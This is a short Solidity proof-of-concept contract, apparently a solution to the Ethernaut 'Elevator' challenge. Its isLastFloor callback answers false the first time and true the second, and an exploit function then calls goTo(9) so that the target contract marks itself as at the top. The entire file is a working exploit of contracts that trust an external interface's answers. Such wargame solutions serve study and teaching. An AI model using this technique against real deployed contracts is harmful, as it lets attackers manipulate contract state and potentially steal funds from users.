// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./elevator.sol";

contract ElevatorPoc is Building {

  Elevator elevator;

  bool private top;

  constructor(address _elevator) {
    elevator = Elevator(_elevator);
  }

  function isLastFloor(uint256 _floor) external returns (bool) {
    if (!top) {
      top = true;
      return false;
    } else {
      return true;
    }
  }

  function exploit() external {
    elevator.goTo(9);
  }

}